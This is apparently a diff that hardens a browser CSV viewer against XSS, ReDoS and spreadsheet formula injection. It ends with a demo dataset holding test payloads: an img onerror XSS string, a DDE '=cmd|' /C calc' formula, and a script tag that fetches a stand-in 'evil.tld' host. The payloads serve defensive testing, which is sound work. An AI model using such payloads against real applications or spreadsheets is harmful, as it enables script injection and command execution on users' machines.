-        clearSearchBtn.classList.add('hidden');
-      }
-
-      // Render Sticky Sortable Table Headers
-      tableHead.innerHTML = '';
-      if (headers.length > 0) {
-        const trHead = document.createElement('tr');
-
-        // Row Number (#) Index Header
-        const thIndex = document.createElement('th');
-        thIndex.className = 'py-3 px-3 text-center w-12 font-mono text-[11px] text-slate-400 dark:text-slate-500 border-r border-slate-200/70 dark:border-slate-700/70';
-        thIndex.textContent = '#';
-        trHead.appendChild(thIndex);
-
-        headers.forEach((headerText, colIndex) => {
-          const th = document.createElement('th');
-          const isSorted = sortState.columnIndex === colIndex;
-          const sortDir = isSorted ? sortState.direction : null;
-
-          th.className = `sort-header py-3 px-4 cursor-pointer transition select-none group border-r last:border-r-0 border-slate-200/60 dark:border-slate-700/60 ${
-            isSorted
-              ? 'bg-indigo-50/90 dark:bg-indigo-950/70 text-indigo-700 dark:text-indigo-300'
-              : 'hover:bg-slate-200/70 dark:hover:bg-slate-700/60'
-          }`;
-
-          let sortIconHtml = `
-            <span class="inline-flex flex-col text-slate-400 opacity-40 group-hover:opacity-90 transition">
-              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M8 9l4-4 4 4m0 6l-4 4-4-4" />
-              </svg>
-            </span>`;
-
-          if (sortDir === 'asc') {
-            sortIconHtml = `
-              <span class="inline-flex items-center text-indigo-600 dark:text-indigo-400">
-                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 15l7-7 7 7" />
-                </svg>
-              </span>`;
-          } else if (sortDir === 'desc') {
-            sortIconHtml = `
-              <span class="inline-flex items-center text-indigo-600 dark:text-indigo-400">
-                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
-                </svg>
-              </span>`;
-          }
-
-          th.innerHTML = `
-            <div class="flex items-center justify-between gap-2 whitespace-nowrap">
-              <span>${escapeHtml(headerText || `Column_${colIndex + 1}`)}</span>
-              ${sortIconHtml}
-            </div>
-          `;
-
-          th.addEventListener('click', () => handleColumnSort(colIndex));
-          trHead.appendChild(th);
-        });
-
-        tableHead.appendChild(trHead);
-      }
-
-      // Compute Pagination Boundaries
-      const totalItems = filteredRows.length;
-      const totalPages = Math.max(1, Math.ceil(totalItems / rowsPerPage));
-      if (currentPage > totalPages) currentPage = totalPages;
-      if (currentPage < 1) currentPage = 1;
-
-      const startIndex = (currentPage - 1) * rowsPerPage;
-      const endIndex = Math.min(startIndex + rowsPerPage, totalItems);
-      const visibleSlice = filteredRows.slice(startIndex, endIndex);
-
-      // Render Table Body Rows
-      tableBody.innerHTML = '';
-      if (visibleSlice.length === 0) {
-        emptyState.classList.remove('hidden');
-      } else {
-        emptyState.classList.add('hidden');
-        const activeQuery = searchQuery.trim();
-
-        visibleSlice.forEach((rowObj, idx) => {
-          const tr = document.createElement('tr');
-          // Zebra striping + smooth hover highlight
-          tr.className = 'even:bg-slate-50/70 dark:even:bg-slate-800/30 hover:bg-indigo-50/60 dark:hover:bg-indigo-950/40 transition-colors';
-
-          // Row Number Cell
-          const tdIndex = document.createElement('td');
-          tdIndex.className = 'py-2.5 px-3 text-center font-mono text-xs text-slate-400 dark:text-slate-500 border-r border-slate-200/60 dark:border-slate-800 select-none';
-          tdIndex.textContent = startIndex + idx + 1;
-          tr.appendChild(tdIndex);
-
-          rowObj.cells.forEach((cellValue) => {
-            const td = document.createElement('td');
-            td.className = 'py-2.5 px-4 text-slate-700 dark:text-slate-200 border-r last:border-r-0 border-slate-200/40 dark:border-slate-800/60 max-w-xs sm:max-w-md truncate';
-            td.title = cellValue;
-            td.innerHTML = highlightMatch(cellValue, activeQuery);
-            tr.appendChild(td);
-          });
-
-          tableBody.appendChild(tr);
-        });
-      }
-
-      renderPaginationControls(totalItems, startIndex, endIndex, totalPages);
-    }
-
-    /*************************************************************************
-     * 7. INTERACTIVE SORTING & PAGINATION CONTROLS
-     *************************************************************************/
-    function handleColumnSort(colIndex) {
-      if (sortState.columnIndex !== colIndex) {
-        sortState.columnIndex = colIndex;
-        sortState.direction = 'asc';
-      } else if (sortState.direction === 'asc') {
-        sortState.direction = 'desc';
-      } else {
-        sortState.columnIndex = -1;
-        sortState.direction = null;
-      }
-      currentPage = 1;
       applyFilterAndSort();
     }
 
-    function renderPaginationControls(totalItems, startIndex, endIndex, totalPages) {
-      const rangeText = document.getElementById('paginationRangeText');
-      const firstBtn = document.getElementById('firstPageBtn');
-      const prevBtn = document.getElementById('prevPageBtn');
-      const nextBtn = document.getElementById('nextPageBtn');
-      const lastBtn = document.getElementById('lastPageBtn');
-      const pageNumbersContainer = document.getElementById('pageNumbersContainer');
+    // =========================================================================
+    // 6. REDOS-FREE SEARCH & TYPE-AWARE SORTING
+    // =========================================================================
+    function applyFilterAndSort() {
+      const rawQuery = searchInput.value.slice(0, MAX_SEARCH_CHARS).trim().toLowerCase();
 
-      const displayStart = totalItems === 0 ? 0 : startIndex + 1;
-      rangeText.innerHTML = `Showing <span class="font-semibold text-slate-900 dark:text-white">${displayStart.toLocaleString()}</span> to <span class="font-semibold text-slate-900 dark:text-white">${endIndex.toLocaleString()}</span> of <span class="font-semibold text-slate-900 dark:text-white">${totalItems.toLocaleString()}</span> rows`;
-
-      firstBtn.disabled = currentPage <= 1 || totalItems === 0;
-      prevBtn.disabled = currentPage <= 1 || totalItems === 0;
-      nextBtn.disabled = currentPage >= totalPages || totalItems === 0;
-      lastBtn.disabled = currentPage >= totalPages || totalItems === 0;
-
-      // Build windowed page number buttons (e.g., 1 ... 4 5 6 ... 12)
-      pageNumbersContainer.innerHTML = '';
-      const pagesToShow = [];
-      if (totalPages <= 7) {
-        for (let p = 1; p <= totalPages; p++) pagesToShow.push(p);
+      // Filter using literal indexOf (Zero RegExp construction = Zero ReDoS risk)
+      if (rawQuery.length === 0) {
+        viewRows = allRows.slice();
       } else {
-        pagesToShow.push(1);
-        if (currentPage > 3) pagesToShow.push('...');
-        const startP = Math.max(2, currentPage - 1);
-        const endP = Math.min(totalPages - 1, currentPage + 1);
-        for (let p = startP; p <= endP; p++) pagesToShow.push(p);
-        if (currentPage < totalPages - 2) pagesToShow.push('...');
-        pagesToShow.push(totalPages);
+        viewRows = allRows.filter(rowObj => {
+          for (let c = 0; c < headers.length; c++) {
+            const val = rowObj.cells[c];
+            if (val && val.toLowerCase().indexOf(rawQuery) !== -1) {
+              return true;
+            }
+          }
+          return false;
+        });
       }
 
-      pagesToShow.forEach(item => {
-        if (item === '...') {
-          const span = document.createElement('span');
-          span.className = 'px-1.5 text-xs text-slate-400';
-          span.textContent = '…';
-          pageNumbersContainer.appendChild(span);
-        } else {
-          const btn = document.createElement('button');
-          btn.type = 'button';
-          const isCurrent = item === currentPage;
-          btn.className = isCurrent
-            ? 'min-w-[30px] h-7 px-2 rounded-lg text-xs font-semibold bg-indigo-600 text-white shadow-sm'
-            : 'min-w-[30px] h-7 px-2 rounded-lg text-xs font-medium bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-700 transition';
-          btn.textContent = item;
-          btn.addEventListener('click', () => {
-            currentPage = item;
-            renderDashboard();
-          });
-          pageNumbersContainer.appendChild(btn);
-        }
-      });
-    }
+      // Sort if active
+      if (sortColIndex >= 0 && sortDirection !== "none") {
+        const dirMultiplier = sortDirection === "asc" ? 1 : -1;
+        const collator = new Intl.Collator(undefined, { numeric: true, sensitivity: "base" });
 
-    /*************************************************************************
-     * 8. FILE INGESTION, EXPORT & EVENT LISTENERS
-     *************************************************************************/
-    function formatFileSize(bytes) {
-      if (bytes < 1024) return `${bytes} B`;
-      if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
-      return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
-    }
+        viewRows.sort((a, b) => {
+          const rawA = (a.cells[sortColIndex] ?? "").trim();
+          const rawB = (b.cells[sortColIndex] ?? "").trim();
 
-    function showToast(message) {
-      const toast = document.getElementById('toastNotification');
-      document.getElementById('toastMessage').textContent = message;
-      toast.classList.remove('translate-y-16', 'opacity-0');
-      clearTimeout(window._toastTimer);
-      window._toastTimer = setTimeout(() => {
-        toast.classList.add('translate-y-16', 'opacity-0');
-      }, 2800);
-    }
+          if (rawA === "" && rawB === "") return a.__index - b.__index;
+          if (rawA === "") return 1;
+          if (rawB === "") return -1;
 
-    function loadDatasetObject(sampleObj) {
-      rawFileContent = sampleObj.content;
-      currentFileName = sampleObj.name;
-      currentFileBytes = new Blob([rawFileContent]).size;
+          // Numeric / Currency check
+          const numA = Number(rawA.replace(/[$,%\s]/g, ""));
+          const numB = Number(rawB.replace(/[$,%\s]/g, ""));
+          if (!Number.isNaN(numA) && !Number.isNaN(numB) && rawA !== "" && rawB !== "") {
+            if (numA !== numB) return (numA - numB) * dirMultiplier;
+          }
 
-      document.getElementById('fileNameDisplay').textContent = currentFileName;
-      document.getElementById('fileSizeBadge').textContent = formatFileSize(currentFileBytes);
-
-      sortState = { columnIndex: -1, direction: null };
-      setActiveDelimiter(sampleObj.delimiter, 'sample');
-      showToast(`Loaded ${sampleObj.name} with delimiter "${formatDelimiterDisplay(sampleObj.delimiter)}"`);
-    }
-
-    async function handleUploadedFile(file) {
-      if (!file) return;
-      rawFileContent = await file.text();
-      currentFileName = file.name;
-      currentFileBytes = file.size;
-
-      document.getElementById('fileNameDisplay').textContent = currentFileName;
-      document.getElementById('fileSizeBadge').textContent = formatFileSize(currentFileBytes);
-
-      // Auto-detect delimiter from uploaded file content
-      const detected = detectBestDelimiter(rawFileContent);
-      sortState = { columnIndex: -1, direction: null };
-      setActiveDelimiter(detected, 'autodetect');
-      showToast(`Loaded "${file.name}" (Delimiter: "${formatDelimiterDisplay(detected)}")`);
-    }
-
-    // Initialize all event listeners
-    window.addEventListener('DOMContentLoaded', () => {
-      // Preset Delimiter Buttons
-      presetButtons.forEach(btn => {
-        btn.addEventListener('click', () => {
-          const chosen = btn.getAttribute('data-delimiter');
-          setActiveDelimiter(chosen, 'preset');
+          return collator.compare(rawA, rawB) * dirMultiplier;
         });
-      });
 
-      // Live Custom Delimiter Input
-      customDelimiterInput.addEventListener('input', (e) => {
-        const val = e.target.value;
-        if (val.length > 0) {
-          setActiveDelimiter(val, 'input');
-        }
-      });
+        const colName = headers[sortColIndex] || `Col ${sortColIndex + 1}`;
+        metaSortState.textContent = `${colName} (${sortDirection.toUpperCase()})`;
+      } else {
+        metaSortState.textContent = "Original Order";
+      }
 
-      // Auto-Detect Delimiter Button
-      document.getElementById('autoDetectBtn').addEventListener('click', () => {
-        const detected = detectBestDelimiter(rawFileContent);
-        setActiveDelimiter(detected, 'autodetect');
-        showToast(`Auto-detected delimiter: "${formatDelimiterDisplay(detected)}"`);
-      });
+      metaTotalRows.textContent = allRows.length.toLocaleString();
+      metaFilteredRows.textContent = viewRows.length.toLocaleString();
 
-      // File Input & Drag-and-Drop Zone
-      const dropZone = document.getElementById('dropZone');
-      const fileInput = document.getElementById('fileInput');
+      renderAll();
+    }
 
-      dropZone.addEventListener('click', () => fileInput.click());
-      fileInput.addEventListener('change', (e) => {
-        if (e.target.files && e.target.files[0]) {
-          handleUploadedFile(e.target.files[0]);
-        }
-      });
-
-      dropZone.addEventListener('dragover', (e) => {
-        e.preventDefault();
-        dropZone.classList.add('border-indigo-500', 'bg-indigo-50/40', 'dark:bg-indigo-950/30');
-      });
-
-      dropZone.addEventListener('dragleave', () => {
-        dropZone.classList.remove('border-indigo-500', 'bg-indigo-50/40', 'dark:bg-indigo-950/30');
-      });
-
-      dropZone.addEventListener('drop', (e) => {
-        e.preventDefault();
-        dropZone.classList.remove('border-indigo-500', 'bg-indigo-50/40', 'dark:bg-indigo-950/30');
-        if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-          handleUploadedFile(e.dataTransfer.files[0]);
-        }
-      });
-
-      // Sample Data Loaders
-      document.getElementById('loadCsvSampleBtn').addEventListener('click', () => loadDatasetObject(SAMPLE_DATASETS.csv));
-      document.getElementById('loadPipeSampleBtn').addEventListener('click', () => loadDatasetObject(SAMPLE_DATASETS.pipe));
-      document.getElementById('loadTabSampleBtn').addEventListener('click', () => loadDatasetObject(SAMPLE_DATASETS.tab));
-
-      // Global Search Input & Clear Button
-      const searchInput = document.getElementById('searchInput');
-      searchInput.addEventListener('input', (e) => {
-        searchQuery = e.target.value;
-        currentPage = 1;
-        applyFilterAndSort();
-      });
-
-      document.getElementById('clearSearchBtn').addEventListener('click', () => {
-        searchInput.value = '';
-        searchQuery = '';
-        currentPage = 1;
-        applyFilterAndSort();
-        searchInput.focus();
-      });
-
-      // Keyboard shortcut '/' to focus search
-      window.addEventListener('keydown', (e) => {
-        if (e.key === '/' && document.activeElement !== searchInput && document.activeElement !== customDelimiterInput) {
-          e.preventDefault();
-          searchInput.focus();
-        }
-      });
-
-      // Reset Sort Button
-      document.getElementById('resetSortBtn').addEventListener('click', () => {
-        sortState = { columnIndex: -1, direction: null };
-        applyFilterAndSort();
-      });
-
-      // Pagination Navigation Buttons
-      document.getElementById('pageSizeSelect').addEventListener('change', (e) => {
-        rowsPerPage = parseInt(e.target.value, 10);
-        currentPage = 1;
-        renderDashboard();
-      });
-
-      document.getElementById('firstPageBtn').addEventListener('click', () => {
-        currentPage = 1;
-        renderDashboard();
-      });
-
-      document.getElementById('prevPageBtn').addEventListener('click', () => {
-        if (currentPage > 1) {
-          currentPage--;
-          renderDashboard();
-        }
-      });
-
-      document.getElementById('nextPageBtn').addEventListener('click', () => {
-        const totalPages = Math.ceil(filteredRows.length / rowsPerPage);
-        if (currentPage < totalPages) {
-          currentPage++;
-          renderDashboard();
-        }
-      });
-
-      document.getElementById('lastPageBtn').addEventListener('click', () => {
-        currentPage = Math.max(1, Math.ceil(filteredRows.length / rowsPerPage));
-        renderDashboard();
-      });
-
-      // Export Current Filtered & Sorted View using `activeDelimiter`
-      document.getElementById('exportBtn').addEventListener('click', () => {
-        if (headers.length === 0) return;
-        const serializeRow = (cells) =>
-          cells.map(cell => {
-            const str = String(cell ?? '');
-            if (str.includes(activeDelimiter) || str.includes('"') || str.includes('\n')) {
-              return `"${str.replace(/"/g, '""')}"`;
-            }
-            return str;
-          }).join(activeDelimiter);
-
-        const outputLines = [
-          serializeRow(headers),
-          ...filteredRows.map(r => serializeRow(r.cells))
-        ];
-
-        const blob = new Blob([outputLines.join('\n')], { type: 'text/plain;charset=utf-8' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `exported_${currentFileName}`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        showToast(`Exported ${filteredRows.length} rows using delimiter "${formatDelimiterDisplay(activeDelimiter)}"`);
-      });
-
-      // Theme Toggle (Light / Dark Mode)
-      document.getElementById('themeToggleBtn').addEventListener('click', () => {
-        document.documentElement.classList.toggle('dark');
-      });
-
-      // Load initial demonstration dataset on startup
-      loadDatasetObject(SAMPLE_DATASETS.csv);
+    searchInput.addEventListener("input", () => {
+      currentPage = 1;
+      applyFilterAndSort();
     });
+
+    clearSearchBtn.addEventListener("click", () => {
+      searchInput.value = "";
+      currentPage = 1;
+      applyFilterAndSort();
+    });
+
+    pageSizeSelect.addEventListener("change", () => {
+      currentPage = 1;
+      renderAll();
+    });
+
+    // =========================================================================
+    // 7. XSS-PROOF DOM RENDERING (ZERO INNERHTML)
+    // =========================================================================
+    function renderSafeHighlightedCell(td, cellText, queryLower) {
+      const text = String(cellText ?? "");
+      if (!queryLower || queryLower.length === 0) {
+        td.textContent = text;
+        return;
+      }
+
+      const lowerText = text.toLowerCase();
+      const qLen = queryLower.length;
+      let cursor = 0;
+      let matchIdx = lowerText.indexOf(queryLower, cursor);
+
+      if (matchIdx === -1) {
+        td.textContent = text;
+        return;
+      }
+
+      while (matchIdx !== -1) {
+        if (matchIdx > cursor) {
+          td.appendChild(document.createTextNode(text.slice(cursor, matchIdx)));
+        }
+        const markNode = document.createElement("mark");
+        markNode.textContent = text.slice(matchIdx, matchIdx + qLen);
+        td.appendChild(markNode);
+
+        cursor = matchIdx + qLen;
+        matchIdx = lowerText.indexOf(queryLower, cursor);
+      }
+
+      if (cursor < text.length) {
+        td.appendChild(document.createTextNode(text.slice(cursor)));
+      }
+    }
+
+    function renderAll() {
+      tableHead.textContent = "";
+      tableBody.textContent = "";
+
+      if (headers.length === 0) {
+        const tr = document.createElement("tr");
+        const td = document.createElement("td");
+        td.className = "empty-state";
+        td.textContent = "No data loaded.";
+        tr.appendChild(td);
+        tableBody.appendChild(tr);
+        updatePaginationControls(0, 1);
+        return;
+      }
+
+      // Render Header Row
+      const headTr = document.createElement("tr");
+      const numTh = document.createElement("th");
+      numTh.className = "row-num-header";
+      numTh.textContent = "#";
+      headTr.appendChild(numTh);
+
+      headers.forEach((hText, colIdx) => {
+        const th = document.createElement("th");
+        let indicator = " \u2195";
+        if (sortColIndex === colIdx) {
+          indicator = sortDirection === "asc" ? " \u2191" : " \u2193";
+        }
+        th.textContent = hText + indicator;
+        th.addEventListener("click", () => {
+          if (sortColIndex !== colIdx) {
+            sortColIndex = colIdx;
+            sortDirection = "asc";
+          } else if (sortDirection === "asc") {
+            sortDirection = "desc";
+          } else {
+            sortColIndex = -1;
+            sortDirection = "none";
+          }
+          applyFilterAndSort();
+        });
+        headTr.appendChild(th);
+      });
+      tableHead.appendChild(headTr);
+
+      // Calculate Pagination Slice
+      const pageSize = parseInt(pageSizeSelect.value, 10) || 25;
+      const totalPages = Math.max(1, Math.ceil(viewRows.length / pageSize));
+      if (currentPage > totalPages) currentPage = totalPages;
+      if (currentPage < 1) currentPage = 1;
+
+      if (viewRows.length === 0) {
+        const tr = document.createElement("tr");
+        const td = document.createElement("td");
+        td.colSpan = headers.length + 1;
+        td.className = "empty-state";
+        td.textContent = "No rows match your current search filter.";
+        tr.appendChild(td);
+        tableBody.appendChild(tr);
+        updatePaginationControls(0, 1);
+        return;
+      }
+
+      const startIdx = (currentPage - 1) * pageSize;
+      const endIdx = Math.min(startIdx + pageSize, viewRows.length);
+      const pageSlice = viewRows.slice(startIdx, endIdx);
+      const queryLower = searchInput.value.slice(0, MAX_SEARCH_CHARS).trim().toLowerCase();
+
+      const fragment = document.createDocumentFragment();
+      pageSlice.forEach(rowObj => {
+        const tr = document.createElement("tr");
+
+        const numTd = document.createElement("td");
+        numTd.className = "row-num-cell";
+        numTd.textContent = String(rowObj.__index);
+        tr.appendChild(numTd);
+
+        for (let c = 0; c < headers.length; c++) {
+          const td = document.createElement("td");
+          const cellVal = rowObj.cells[c] ?? "";
+          td.title = cellVal.slice(0, 500);
+          renderSafeHighlightedCell(td, cellVal, queryLower);
+          tr.appendChild(td);
+        }
+        fragment.appendChild(tr);
+      });
+
+      tableBody.appendChild(fragment);
+      updatePaginationControls(viewRows.length, totalPages);
+    }
+
+    // =========================================================================
+    // 8. PAGINATION NAVIGATION CONTROLS
+    // =========================================================================
+    function updatePaginationControls(totalItems, totalPages) {
+      pageButtonsContainer.textContent = "";
+
+      if (totalItems === 0) {
+        pageSummaryText.textContent = "Page 0 of 0";
+        firstPageBtn.disabled = true;
+        prevPageBtn.disabled = true;
+        nextPageBtn.disabled = true;
+        lastPageBtn.disabled = true;
+        jumpPageInput.disabled = true;
+        jumpPageBtn.disabled = true;
+        return;
+      }
+
+      pageSummaryText.textContent = `Page ${currentPage} of ${totalPages}`;
+      firstPageBtn.disabled = currentPage <= 1;
+      prevPageBtn.disabled = currentPage <= 1;
+      nextPageBtn.disabled = currentPage >= totalPages;
+      lastPageBtn.disabled = currentPage >= totalPages;
+      jumpPageInput.disabled = totalPages <= 1;
+      jumpPageBtn.disabled = totalPages <= 1;
+      jumpPageInput.max = String(totalPages);
+
+      const windowRadius = 2;
+      let startPage = Math.max(1, currentPage - windowRadius);
+      let endPage = Math.min(totalPages, currentPage + windowRadius);
+
+      for (let p = startPage; p <= endPage; p++) {
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.textContent = String(p);
+        if (p === currentPage) btn.className = "active-preset";
+        btn.addEventListener("click", () => {
+          currentPage = p;
+          renderAll();
+        });
+        pageButtonsContainer.appendChild(btn);
+      }
+    }
+
+    firstPageBtn.addEventListener("click", () => { currentPage = 1; renderAll(); });
+    prevPageBtn.addEventListener("click", () => { if (currentPage > 1) { currentPage--; renderAll(); } });
+    nextPageBtn.addEventListener("click", () => { currentPage++; renderAll(); });
+    lastPageBtn.addEventListener("click", () => {
+      const pageSize = parseInt(pageSizeSelect.value, 10) || 25;
+      currentPage = Math.max(1, Math.ceil(viewRows.length / pageSize));
+      renderAll();
+    });
+
+    jumpPageBtn.addEventListener("click", () => {
+      const target = parseInt(jumpPageInput.value, 10);
+      if (!Number.isNaN(target) && target >= 1) {
+        currentPage = target;
+        renderAll();
+      }
+    });
+
+    // =========================================================================
+    // 9. FORMULA-SAFE CSV EXPORT (CLOSES DDE / MACRO EXPLOIT VECTOR)
+    // =========================================================================
+    function formatCellForExport(value, delimiter, sanitizeFormulas) {
+      let str = String(value ?? "");
+      if (sanitizeFormulas && /^[=+\-@\t\r]/.test(str)) {
+        str = "'" + str; // Prefix single quote to disarm spreadsheet formulas
+      }
+      if (str.includes('"') || str.includes("\n") || str.includes("\r") || str.includes(delimiter)) {
+        return '"' + str.replace(/"/g, '""') + '"';
+      }
+      return str;
+    }
+
+    exportBtn.addEventListener("click", () => {
+      if (headers.length === 0) return;
+      const sanitize = sanitizeExportToggle.checked;
+      const lines = [];
+
+      lines.push(headers.map(h => formatCellForExport(h, activeDelimiter, sanitize)).join(activeDelimiter));
+      viewRows.forEach(rowObj => {
+        const rowStr = headers.map((_, c) => formatCellForExport(rowObj.cells[c] ?? "", activeDelimiter, sanitize)).join(activeDelimiter);
+        lines.push(rowStr);
+      });
+
+      const blob = new Blob([lines.join("\r\n")], { type: "text/csv;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = `exported_view_${Date.now()}.csv`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    });
+
+    // =========================================================================
+    // 10. SECURITY VERIFICATION DATASET (TESTS QUOTES, XSS, & FORMULA PAYLOADS)
+    // =========================================================================
+    loadDemoBtn.addEventListener("click", () => {
+      hideBanner();
+      setSafeDelimiter(",");
+      const demoLines = [
+        'Node_ID,Location,Latency_ms,Throughput_Mbps,Security_Payload_Test,Notes',
+        'SRV-101,"Nanjing, CN",14.2,"$1,240.00","Normal clean record","Baseline gateway"',
+        'SRV-102,"Jakarta, ID",48.7,"$980.50","<img src=x onerror=alert(1)>","DOM XSS payload rendered safely as literal text"',
+        'SRV-103,"Singapore, SG",22.1,"$2,150.75","=cmd|\' /C calc\'!A0","CSV Formula Injection neutralized on export"',
+        'SRV-104,"Tokyo, JP",31.0,"$1,620.00","<script>fetch(\'https://evil.tld\')<\/script>","Blocked by both textNode rendering and CSP"',
+        'SRV-105,"Surabaya, ID",52.4,"$840.00","([+*{Regex_Meta_Chars}*+])","Safe to search without ReDoS crash"',
+        'SRV-106,"Frankfurt, DE",165.8,"$3,400.00","Quoted ""inner quotes"" and, comma","RFC 4180 quote parser test"'
+      ];
+      metaFileName.textContent = "security_verification_demo.csv";
+      rawFileText = demoLines.join("\n");
+      metaFileSize.textContent = formatBytes(rawFileText.length);
+      currentPage = 1;
+      sortColIndex = -1;
+      sortDirection = "none";
+      parseAndProcessText();
+    });
+
+    // Load verification dataset on initial launch so the interface is immediately testable
+    loadDemoBtn.click();
   </script>
 </body>
 </html>
